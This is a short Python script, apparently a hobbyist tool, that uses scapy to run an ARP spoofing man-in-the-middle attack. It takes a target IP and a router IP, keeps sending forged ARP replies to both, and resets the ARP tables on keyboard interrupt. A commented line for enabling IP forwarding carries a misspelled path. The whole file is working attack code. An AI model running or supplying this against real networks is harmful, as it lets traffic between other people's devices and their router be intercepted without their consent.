#!/usr/bin/python3
#echo 1> /proc/sys/net/ipv4/ip_forrward
import scapy.all as scapy
import time
import optparse

def arguments():
	parser = optparse.OptionParser()
	parser.add_option("-t", dest="target_ip" , help="Target ip ")
	parser.add_option("-r", dest="router_ip" , help="router ip ")
	options , arguments = parser.parse_args()
	if not options.target_ip:
		parser.error("[+] Please enter target ip ")

	if not options.router_ip:
		parser.error("[+] Please enter router ip ")
	return options.target_ip , options.router_ip


def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	frame = broadcast/arp_request 	
	answered_list , unanswered_list = scapy.srp(frame,timeout=1,verbose=False) #send-receive with custom header
	return answered_list[0][1].hwsrc
	

def spoof(target_ip,r_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst = target_ip, hwdst= target_mac , psrc= r_ip )
	scapy.send(packet , verbose=False)

def restore(target_ip , r_ip):
	target_mac = get_mac(target_ip)
	r_mac = get_mac(r_ip)
	packet =scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=r_ip, hwsrc=r_mac)
	scapy.send(packet, verbose=False, count =4)


tip , rip = arguments()

counter=0
try:

	while True:
		counter+=2
		spoof(tip , rip)
		spoof(rip , tip)
		print("\r[+] Packets Sent "+ str(counter),end="")
		time.sleep(2)
except KeyboardInterrupt :
		print("[+] Keyboard Interrupt Detechted ctrl+z ; Resetting ARP Tables")
		restore(tip , rip)
		restore(rip , tip)
